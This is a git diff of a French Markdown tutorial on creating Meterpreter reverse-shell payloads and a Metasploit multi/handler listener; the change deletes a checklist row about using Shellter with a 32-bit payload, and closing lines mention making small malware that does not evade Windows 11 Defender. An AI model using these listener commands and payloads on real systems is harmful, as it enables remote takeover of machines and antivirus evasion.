@@ -534,7 +534,6 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD [PAYLOAD]; set LHOST [V
 | **2. LHOST identique** | L'IP doit être la même dans les deux commandes |
 | **3. LPORT identique** | Le port doit être le même dans les deux commandes |
 | **4. HTTPS = sudo** | Le port 443 nécessite `sudo` pour l'écoute |
-| **5. 32-bit = sans x64** | Pour Shellter, utiliser `windows/meterpreter_reverse_tcp` (sans x64) |
 
 ## maintenant nous savons faire des petit malwar intermediaire mais qui ne passe pas les nouvelle tehcnologie de type window 11 defender 
 ## nous faire un port d ecoute mais on se demande encore ok mais qu est ce qu on peut bien faire maintenant.
